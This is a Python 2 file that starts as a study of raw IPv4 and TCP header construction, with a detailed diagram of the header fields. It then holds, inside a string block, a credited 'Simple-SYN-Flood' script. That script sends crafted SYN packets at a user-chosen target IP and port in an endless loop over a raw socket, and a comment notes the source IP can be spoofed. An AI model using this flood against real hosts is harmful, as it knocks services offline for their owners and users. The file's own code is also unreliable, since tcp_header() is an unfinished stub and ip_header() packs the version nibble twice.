import socket 
import sys 
import random
from struct import *

def checksum(msg):
	s = 0	# binary sum
	# loop taking 2 characters at a time
	for i in range(0, len(msg), 2):
		a = ord(msg[i])
		b = ord(msg[i+1])
		s = s + ((a << 8) + b)
	# One's complemet
	s = (s >> 16) + (s & 0xffff)
	s = ~s & 0xffff
	return s

'''

	IP HEADER:

	0     1     2     3     4     5     6     7     8     9     10    11    12    13    14    15    16    17    18    19    20    21    22    23    24    25    26    27    28    29    30    31    32
	++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++----++
	||                      ||                      ||                                              ||                                                                                              ||
      0 ||       Version        ||  IHL(Header Length)  ||           TOS(Type of Service)               ||                                        Total Length                                          ||
	||			||			||						||				                                                                ||
	++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------++
	||     	                                                                                        ||    IP Flags    ||                                                                            ||
      4 ||                                          Identification                                      ||    ||    ||    ||                        Fragment Offset                                     ||
        ||                                                                                              || x  || D  || M  ||                                                                            || 
        ||                                                                                              ||    ||    ||    ||                                                                            ||
        ++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------++
        ||                                              ||                                              ||                                                                                              ||
      8	||              TTL(Time to Live)               ||                   Protocol                   ||                                      Header Checksum                                         ||  
	||                                              ||                                              ||                                                                                              ||
        ++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------++   
	||                                                                                                                                                                                              ||  
     12	||                                                                                      SOURCE ADDRESSS                                                                                         ||
	||                                                                                                                                                                                              ||
        ++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------++
        ||                                                                                                                                                                                              || 
     16 ||                                                                                    DESTINATION ADDRESS                                                                                       ||   
        ||                                                                                                                                                                                              ||
        ++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------++
        ||                                                                                                                                                                                              || 
     20 ||                                                                                    OPTIONS AND PADDING                                                                                       ||
	||                                                                                                                                                                                              ||
        ++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------++ 

	Version: 
		The version of IP currently used. (such as IPv4)

	IHL:
		IP header length (IHL) - datagram header length. Points to the beginning of the data. The minimum value for a correct header is 5.

	TOS(Type of Service):
		Data in this field indicate the quality of service desired. The effects of values in the precedence fields depend on the network technology employed, and values must be configured accordingly.
		Format of the type of service field:
		 * Bits 0-2: Precedence
		  111 = Normal Control
		  110 = Internetwork Control
		  101 = CRITIC/ECP
		  100 = Flash Override
		  011 = Flash
		  010 = Immediate
		  001 = Priority
		  000 = Routine

		 * Bit 3: Delay | 0 = normal delay, 1 = low delay
		 * Bit 4: Throughput | 0 = normal throughput, 1 = high throughput
		 * Bit 5: Reliability | 0 = normal reliability, 1 = high reliability
		 * Bits 6-7: Reserved

	Total Length:
		The length of the datagram in byte, including the IP header and data. This field enables datagrams to consist of up to 65,535 bytes. The standard recommends that all hosts be prepared to receive
		datagrams of at least 576 bytes in length.

	Identification:
		An identification field used to aid reassembles of the fragments of a datagram.

	Flags:
		If a datagram is fragmanted, the MB bit is 1 in all fragments except the last. This field contains three control bits:
		 * Bit 0: Reserved
		 * Bit 1 (DF): 1 = Do not fragment and 0 = may fragment
		 * Bit 2 (MF): 1 = More fragments and 0 = last fragment

	Fragment Offset:
		For fragmented datagrams, indicates the position in the datagram of this fragment.

	TTL(Time to Live):
		Indicates the maximum time the datagram may remain on the network.

	Protocol:
		The 8 bits field of the upper layer protocol associated with the data portion of the datagram. (RFC 1700)
		Some protocol numbers:
		 1 : ICMP(Internet Control Message)
		 2 : IGMP(Internet Group Management)
		 4 : IP(IP in the IP encapsulation)
		 5 : ST(Stream)
		 6 : TCP(Transmission Control Protocol)
		 17: UDP(User Datagram Protocol)

	Header Checksum:
		A checksum for the header only. This value must be recalculated each time the header is modified.

	Source Address:
		The IP address of the originated datagram.

	Destination Adress:
		The IP address of the host that is the final destination of the datagram.

	Options:
		May contaion 0 or more options.

	Padding:
		Filled with bits to ensure that size of the header is a 32 bit multiple.

'''


def ip_header(srcIP, dstIP):
	iph_ihl = 5											# Internet Header Length -> 4 bits
	iph_ver = 4											# IP version (current IPv4) -> 4 bits
	iph_tos = 0											# Type of Service (0: Normal Service) -> 8 bits
	iph_len = 40										# IP Header + TCP Header = 40 -> 16 bits
	iph_id = 54321 										# Identification, can be any random number -> 16 bits
	iph_offset = 0										# Include flags and fragment offset -> 16 bits
	iph_ttl = 255										# Time to Live -> 8 bits
	iph_protocol = socket.IPPROTO_TCP					# Protocol -> 8 bits
	iph_checksum = 0									# Checksum, initally zero -> 16 bits
	iph_srcIP = socket.inet_aton(srcIP)					# Source IP, can be spoofed -> 32 bits
	iph_dstIP = socket.inet_aton(dstIP)					# Destination IP -> 32 bits
	iph_ihl_version = (iph_ver << 4) + iph_ver  		# To represent as 8 bits concatanete ihl and version

	'''
	pack(format, v1, v2, ...)
	format:
		'B': unsigned char (1 byte)
		'H': unsigned short (2 bytes)
		's': char[] (each one is 1 byte, 4s means 4 bytes)
	'''
	ip_header = pack('!BBHHHBBH4s4s', 
		iph_ihl_version, iph_tos, iph_len, iph_id, iph_offset, iph_ttl, iph_protocol, iph_checksum, iph_srcIP, iph_dstIP)
	return ip_header

def tcp_header(srcPort, dstPort):
	th_sport 
	th_dport
	th_seq
	th_ack



t = ip_header('127.0.0.0', '127.0.0.1')
'''

def header():
  ihl = 5
  version = 4
  tos = 0
  tot_len = 20 + 20
  id = 54321
  frag_off = 0
  ttl = 255
  protocol = socket.IPPROTO_TCP
  check = 10
  saddr =socket.inet_aton ( source_ip )
  daddr = socket.inet_aton ( dest_ip )
  ihl_version = (version << 4) + ihl
  global ip_header
  ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

def tcp():
  header()
  source = random.randint(1024, 65535)
  dest = int(sys.argv[3])
  seq = 0
  ack_seq = 0
  doff = 5
  fin = 0
  syn = 1
  rst = 0
  psh = 0
  ack = 0
  urg = 0
  window = socket.htons (5840)
  check = 0
  urg_ptr = 0
  offset_res = (doff << 4) + 0
  tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
  source_address = socket.inet_aton( source_ip )
  dest_address = socket.inet_aton(dest_ip)
  placeholder = 0
  protocol = socket.IPPROTO_TCP
  tcp_length = len(tcp_header)
  psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
  psh = psh + tcp_header;
  tcp_checksum = checksum(psh)
  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
  global packet
  packet = ip_header + tcp_header

def run():
  while True:
    tcp()
    s.sendto(packet, (dest_ip , 0))
    print '.',

run()




#!/usr/bin/env python2
#Code by LeeOn123
import socket, sys, threading, random
from struct import *
if len(sys.argv)<=3:
    print("C0De 3y LeeOn123 --> Simple-SYN-Flood")
    print("Usage: "+ sys.argv[0]+ " <your ip> <target ip> <port>")
    sys.exit()

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w

    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff

    return s

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error , msg:
    print ('Socket could not be created. Error Code : ' + str(msg[0]) +' Message ' + msg[1])
    sys.exit()

s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

source_ip = str(sys.argv[1])
dest_ip = socket.gethostbyname(str(sys.argv[2]))

'''
